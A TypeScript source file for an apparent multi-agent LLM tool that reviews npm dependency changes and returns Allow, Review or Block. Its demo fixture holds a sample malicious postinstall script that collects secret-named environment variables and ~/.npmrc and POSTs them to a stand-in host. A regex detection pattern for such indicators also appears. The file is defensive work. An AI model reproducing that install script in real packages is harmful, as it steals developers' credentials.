import { createHash } from "node:crypto";

export const ROLES = ["Baseline", "Manifest", "Static", "Behavior", "Skeptic", "Judge"] as const;
export type Role = (typeof ROLES)[number];
export type Verdict = "Allow" | "Review" | "Block";

export type Finding = {
  role: Role;
  verdict: Verdict;
  summary: string;
  evidence: string[];
  confidence: number;
};

export type ReviewInput = { repoUrl?: string; branch?: string; files?: Record<string, string>; policy?: string };
export type RepoInspection = { repoUrl: string; defaultBranch: string; branches: string[]; dependencyFiles: string[] };

export const DEPENDENCY_FILES = ["package.json", "package-lock.json", "pnpm-lock.yaml", "yarn.lock", "requirements.txt", "pyproject.toml"] as const;

const demoFiles = {
  "package.json": JSON.stringify({ name: "locksmith-demo", dependencies: { "safe-logger": "1.0.0", "fast-env-sync": "1.5.0" } }, null, 2),
  "package-lock.json": JSON.stringify({ lockfileVersion: 3, packages: { "node_modules/fast-env-sync": { version: "1.5.0", hasInstallScript: true, scripts: { postinstall: "node scripts/verify.js" } } } }, null, 2),
  "node_modules/fast-env-sync/scripts/verify.js": [
    "const fs = require('fs');",
    "const {exec} = require('child_process');",
    "const tokenNames = Object.keys(process.env).filter((name) => /TOKEN|KEY|SECRET/.test(name));",
    "const npmrc = fs.existsSync(`${process.env.HOME}/.npmrc`) ? fs.readFileSync(`${process.env.HOME}/.npmrc`, 'utf8') : '';",
    "fetch('https://fast-env-sync.invalid/collect', { method: 'POST', body: JSON.stringify({ tokenNames, npmrc }) });",
    "exec('node scripts/prepare-cache.js');",
  ].join("\n"),
};

function githubCoordinates(url: string) {
  const match = /^https?:\/\/(?:www\.)?github\.com\/([^/]+)\/([^/#]+?)(?:\.git)?(?:[\/#].*)?$/.exec(url);
  return match ? { owner: match[1], repo: match[2] } : null;
}

async function githubJson<T>(path: string): Promise<T> {
  const response = await fetch(`https://api.github.com${path}`, {
    headers: { Accept: "application/vnd.github+json", "User-Agent": "locksmith-demo" },
    signal: AbortSignal.timeout(8_000),
  });
  if (response.status === 404) throw new Error("Repository is private, missing, or not accessible without GitHub auth");
  if (!response.ok) throw new Error(`GitHub lookup failed (${response.status})`);
  return await response.json() as T;
}

export async function inspectGitHubRepo(repoUrl: string): Promise<RepoInspection> {
  const coordinates = githubCoordinates(repoUrl);
  if (!coordinates) throw new Error("Enter a GitHub repository URL like https://github.com/owner/repo");
  const repo = await githubJson<{ default_branch: string; private: boolean }>(`/repos/${coordinates.owner}/${coordinates.repo}`);
  if (repo.private) throw new Error("This repository is private. Locksmith cannot access it without GitHub auth.");
  const branches = await githubJson<{ name: string }[]>(`/repos/${coordinates.owner}/${coordinates.repo}/branches?per_page=20`);
  const tree = await githubJson<{ tree?: { path: string; type: string }[] }>(`/repos/${coordinates.owner}/${coordinates.repo}/git/trees/${encodeURIComponent(repo.default_branch)}?recursive=1`);
  const names = new Set(tree.tree?.filter(item => item.type === "blob").map(item => item.path));
  const dependencyFiles = DEPENDENCY_FILES.filter(name => names.has(name));
  return { repoUrl, defaultBranch: repo.default_branch, branches: Array.from(new Set([repo.default_branch, ...branches.map(branch => branch.name)])), dependencyFiles };
}

export async function gatherEvidence(input: ReviewInput) {
  if (input.files && Object.keys(input.files).length) return { source: "submitted-files", files: input.files };
  if (!input.repoUrl) return { source: "demo", files: demoFiles };
  const coordinates = githubCoordinates(input.repoUrl);
  if (!coordinates) throw new Error("repoUrl must be a public GitHub repository URL");
  const wanted = DEPENDENCY_FILES;
  const files: Record<string, string> = {};
  await Promise.all(wanted.map(async name => {
    const branch = encodeURIComponent(input.branch || "HEAD");
    const url = `https://raw.githubusercontent.com/${coordinates.owner}/${coordinates.repo}/${branch}/${name}`;
    const response = await fetch(url, { signal: AbortSignal.timeout(8_000) });
    if (response.ok) files[name] = (await response.text()).slice(0, 100_000);
  }));
  if (!Object.keys(files).length) throw new Error("No supported dependency files found in the public repository");
  return { source: `${input.repoUrl}#${input.branch || "HEAD"}`, files };
}

export function dependencyStateId(source: string, files: Record<string, string>) {
  const hash = createHash("sha256");
  hash.update(source);
  for (const name of Object.keys(files).sort()) hash.update(`\n${name}\0${files[name]}`);
  return `state_${hash.digest("hex").slice(0, 24)}`;
}

export const AGENT_PROMPTS: Record<Role, string> = {
  Baseline: "You are Locksmith's Baseline Agent. Compare the current dependency state against the last approved workspace baseline. Focus only on dependency state ID inputs, changed dependency files, added/updated/removed packages, new transitives, direct vs transitive reachability, and graph impact. Do not inspect package code, runtime behavior, or final policy. Pass exact risky packages and paths to Manifest, Static, and Behavior.",
  Manifest: "You are Locksmith's Manifest Agent. Review only package metadata and manifest-level risk: package name, version, description, repository links, publisher/maintainer signals, publish timing, lifecycle scripts, dependency count jumps, and package-purpose mismatch. Do not judge source behavior, sandbox execution, final policy, or baseline approval. Never invent registry facts not present in evidence.",
  Static: "You are Locksmith's Static Agent. Inspect changed dependency source with deterministic checks first, then explain the evidence. Focus on obfuscation, eval/dynamic Function, env/secret/home-directory access, file reads/writes, outbound network calls, child_process, shell execution, postinstall paths, and persistence attempts. Cite exact files and snippets. Do not issue the final verdict.",
  Behavior: "You are Locksmith's Behavior Agent. Report concrete install/runtime behavior from sandbox traces when available, otherwise clearly mark behavior inferred from supplied files. Focus on lifecycle execution, spawned processes, network calls, filesystem access outside expected paths, credential discovery, persistence, and unexpected side effects. Do not summarize metadata or decide policy.",
  Skeptic: "You are Locksmith's Skeptic Agent. Challenge Baseline, Manifest, Static, and Behavior claims as possible false positives. Ask whether behavior is normal for this package type, whether evidence is direct or inferred, whether repo context changes severity, and whether the claim is strong enough for Allow, Review, or Block. Do not find new risks or make the final verdict.",
  Judge: "You are Locksmith's Judge Agent. Resolve the five prior agents into one repo-specific decision: Allow, Review, or Block. Block credential theft, install-time execution abuse, hidden network exfiltration, destructive file access, obfuscation paired with sensitive access, or risky changes replacing an approved state. Review incomplete but suspicious evidence. Allow only low-risk explained behavior. Suggest the smallest remediation.",
};

export const DEMO_FINDINGS: Record<Role, Omit<Finding, "role">> = {
  Baseline: {
    verdict: "Review",
    summary: "Current npm state diverges from the approved baseline: fast-env-sync changed from 1.4.2 to 1.5.0 as a direct dependency with install-time reachability.",
    evidence: ["package-lock.json now contains fast-env-sync@1.5.0", "node_modules/fast-env-sync hasInstallScript=true", "Previous workspace baseline approved fast-env-sync@1.4.2"],
    confidence: 0.86,
  },
  Manifest: {
    verdict: "Review",
    summary: "Manifest evidence is suspicious: fast-env-sync@1.5.0 adds a postinstall script for a package whose stated job is environment-file syncing.",
    evidence: ["scripts.postinstall = node scripts/verify.js", "Purpose mismatch: env sync helper should not need install-time credential probing", "Lifecycle script was introduced in the changed package state"],
    confidence: 0.82,
  },
  Static: {
    verdict: "Review",
    summary: "Static scan found the postinstall path reads token-shaped environment variables, opens ~/.npmrc, posts to an external endpoint, and spawns a child process.",
    evidence: ["verify.js filters process.env for TOKEN|KEY|SECRET", "verify.js reads `${HOME}/.npmrc`", "fetch('https://fast-env-sync.invalid/collect', ...)", "child_process.exec('node scripts/prepare-cache.js')"],
    confidence: 0.94,
  },
  Behavior: {
    verdict: "Review",
    summary: "Behavior evidence predicts an install-time network request and child process; sandbox confirmation should capture request body before override.",
    evidence: ["postinstall executes automatically during npm install", "Static execution path reaches outbound POST", "Child process is launched from the install script"],
    confidence: 0.78,
  },
  Skeptic: {
    verdict: "Review",
    summary: "False-positive check: env tools may read environment variables, but reading ~/.npmrc and sending token names to an undocumented endpoint survives critique.",
    evidence: ["Legitimate telemetry would be documented", "Package purpose does not require npm credential file access", "Concern is direct source evidence, not only metadata"],
    confidence: 0.88,
  },
  Judge: {
    verdict: "Block",
    summary: "Block this dependency state. Pin fast-env-sync to 1.4.2 or rollback the lockfile until the install-time credential access and outbound POST are removed.",
    evidence: ["New direct dependency state replaces an approved baseline", "Postinstall reads secret-shaped env names and ~/.npmrc", "Outbound POST is undocumented and repo-relevant under strict policy", "Skeptic accepted the core concern"],
    confidence: 0.92,
  },
};

function fallback(role: Role, files: Record<string, string>, previous: Finding[]): Finding {
  const joined = Object.entries(files).map(([n, v]) => `${n}\n${v}`).join("\n");
  const risky = /postinstall|child_process|curl\s|eval\s*\(|process\.env|\.npmrc|fetch\s*\(/i.test(joined);
  if (risky) {
    const finding = DEMO_FINDINGS[role];
    return { role, ...finding, evidence: [...finding.evidence, `${previous.length} earlier panel findings considered`] };
  }
  const verdict: Verdict = role === "Judge" ? (risky ? "Block" : "Allow") : risky ? "Review" : "Allow";
  const summaries: Record<Role, string> = {
    Baseline: "Initial dependency baseline computed from submitted files.", Manifest: risky ? "Lifecycle or install-time signals require review." : "No suspicious manifest signal found.",
    Static: risky ? "Install code contains network or process-execution indicators." : "No high-risk static pattern found.", Behavior: risky ? "Install may launch a child process or make a network request; sandbox confirmation is advised." : "No risky behavior inferred.",
    Skeptic: risky ? "Legitimate installers may use network/process access, but the combined shell-download pattern remains unsupported." : "No concrete evidence justifies escalation.",
    Judge: risky ? "Block until the install script is removed or independently verified." : "Allow this exact dependency state.",
  };
  return { role, verdict, summary: summaries[role], evidence: risky ? ["Matched lifecycle/network/process indicator in submitted files", `${previous.length} earlier panel findings considered`] : ["No deterministic high-risk indicator matched"], confidence: 0.75 };
}

function validFinding(value: unknown, role: Role): Finding {
  if (!value || typeof value !== "object") throw new Error(`${role} returned invalid JSON`);
  const v = value as Record<string, unknown>;
  if (!(["Allow", "Review", "Block"] as unknown[]).includes(v.verdict) || typeof v.summary !== "string" || !Array.isArray(v.evidence)) throw new Error(`${role} returned an invalid finding`);
  return { role, verdict: v.verdict as Verdict, summary: v.summary.slice(0, 1000), evidence: v.evidence.filter(x => typeof x === "string").slice(0, 8) as string[], confidence: Math.max(0, Math.min(1, typeof v.confidence === "number" ? v.confidence : 0.5)) };
}

async function infer(role: Role, files: Record<string, string>, previous: Finding[], policy: string): Promise<Finding> {
  const key = process.env.QWEN_API_KEY;
  if (!key) return fallback(role, files, previous);
  const baseUrl = (process.env.QWEN_BASE_URL || "https://dashscope-intl.aliyuncs.com/compatible-mode/v1").replace(/\/$/, "");
  const response = await fetch(baseUrl.endsWith("/chat/completions") ? baseUrl : `${baseUrl}/chat/completions`, {
    method: "POST", headers: { Authorization: `Bearer ${key}`, "Content-Type": "application/json" }, signal: AbortSignal.timeout(60_000),
    body: JSON.stringify({ model: process.env.QWEN_MODEL || "qwen-plus", temperature: 0.1, response_format: { type: "json_object" }, messages: [
      { role: "system", content: `${AGENT_PROMPTS[role]} Return only JSON: {\"verdict\":\"Allow|Review|Block\",\"summary\":\"...\",\"evidence\":[\"...\"],\"confidence\":0.0}. Never invent evidence.` },
      { role: "user", content: JSON.stringify({ policy, files, previousFindings: previous }) },
    ] }),
  });
  if (!response.ok) throw new Error(`Qwen ${role} request failed (${response.status})`);
  const payload = await response.json() as { choices?: { message?: { content?: string } }[] };
  const content = payload.choices?.[0]?.message?.content;
  if (!content) throw new Error(`Qwen ${role} returned no content`);
  try { return validFinding(JSON.parse(content.replace(/^```(?:json)?\s*|\s*```$/g, "")), role); }
  catch (error) { if (error instanceof SyntaxError) throw new Error(`Qwen ${role} returned malformed JSON`); throw error; }
}

export async function reviewDependencies(input: ReviewInput) {
  const evidence = await gatherEvidence(input);
  const findings: Finding[] = [];
  for (const role of ROLES) findings.push(await infer(role, evidence.files, findings, input.policy || "strict"));
  const judge = findings.at(-1)!;
  return {
    dependencyStateId: dependencyStateId(evidence.source, evidence.files),
    source: evidence.source,
    mode: process.env.QWEN_API_KEY ? "qwen" : "mock",
    model: process.env.QWEN_API_KEY ? process.env.QWEN_MODEL || "qwen-plus" : "deterministic fallback",
    findings,
    verdict: judge.verdict,
    remediation: judge.summary,
  };
}
